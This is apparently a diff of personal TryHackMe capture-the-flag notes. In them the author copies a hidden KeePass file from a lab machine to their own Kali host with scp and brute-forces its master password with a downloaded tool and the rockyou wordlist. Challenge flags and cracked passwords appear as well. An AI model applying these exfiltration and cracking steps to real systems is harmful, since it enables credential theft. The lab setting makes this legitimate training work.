@@ -19,6 +19,9 @@
 #flag.zip:winter4ever
 ## THM{Cr4ck1n6_z1p$_1s_34$yyyy}
 
+//*EGG*//
+	tit_for_tat
+
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
@@ -125,12 +128,10 @@ cat flag.txt
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-
-
 ### BONUS ###
 -----------------------
 # Starting on new day to find this egg
-ip=10.64.129.163
+ip=10.67.134.25
 
 // *SideQuest 2 EggKey* //
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -189,32 +190,80 @@ User ubuntu may run the following commands on tryhackme:
     (ALL) NOPASSWD: ALL
 	(ALL) NOPASSWD: ALL
 
-sudo su -
-
 //NOTE: The last egg image was named sq1.png, lets see if I can find somthing similar
 
 find / -type f -iname "sq*.png" 2>/dev/null
 //Nothing of interest
 
-//Found a weird location for a swapfile in /
-scp swapfile kali@192.168.190.148:/home/kali/haxterm/data/Day09
+//Found an interesting hidden file in ubuntu's home directory
 
-~/.john/john.pot
+ls -la /home/ubuntu
+-rw-------  1 ubuntu ubuntu 419413 Dec  4 09:29 .Passwords.kdbx
+
+//Lets grab it
+scp .Passwords.kdbx kali@192.168.190.148:/home/kali/haxterm/data/Day09/Passwords.kdbx
+
+// LocalBox Keepass database file crack
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+keepass2john Passwords.kdbx > keepass_hash.txt
+! Passwords.kdbx : File version '40000' is currently not supported!
+
+//KDBX 4.x format (Keepass >=2.36) is not supported by keepass2john yet, so there is no known way to extract the hash and crack it.
 
 
-root@tryhackme:~# ss -4antl
-State                Recv-Q               Send-Q                             Local Address:Port                             Peer Address:Port              Process              
-LISTEN               0                    4096                                  127.0.0.54:53                                    0.0.0.0:*                                      
-LISTEN               0                    100                                      0.0.0.0:80                                    0.0.0.0:*                                      
-LISTEN               0                    5                                        0.0.0.0:5901                                  0.0.0.0:*                                      
-LISTEN               0                    4096                               127.0.0.53%lo:53                                    0.0.0.0:*                                      
-LISTEN               0                    4096                                   127.0.0.1:631                                   0.0.0.0:*
+## Brute Forcing KeePass Database Passwords with python
+
+sudo apt install python3-venv
+python3 -m venv keepass_crack
+source keepass_crack/bin/activate
+
+//You will now be in your virtual python environment
+
+//Install the needed Python library
+pip install pykeepass
+
+//Found this tool online for brute-forcing these types of files
+git clone https://github.com/toneillcodes/brutalkeepass.git
+
+cp brutalkeepass/bfkeepass.py .
+
+//Test for usage
+python3 bfkeepass.py         
+usage: bfkeepass.py [-h] -d DATABASE -w WORDLIST [-o] [-v]
+bfkeepass.py: error: the following arguments are required: -d/--database, -w/--wordlist
+
+//Deflate gzip file
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+//Run
+python3 bfkeepass.py -d Passwords.kdbx -w /usr/share/wordlists/rockyou.txt -o
+[*] Running bfkeepass
+[*] Starting bruteforce process...
+[!] Success! Database password: harrypotter
+[>] Dumping entries...
+--------------------
+[>] Title: Key
+[>] Username: None
+[>] Password: None
+[>] URL: None
+[>] Notes: None
+--------------------
+[>] Entry dump complete.
+[*] Stopping bruteforce process.
+[*] Done.
+
+//Open the database file with KeePassXC and enter the password
+//-Click on the key title
+//-Click Advanced and you are able to see the sq2.png that you can save
+
+tit_for_tat
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-
-
-
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+
+2026-01-02 23:14:50 EST -- COMPLETE
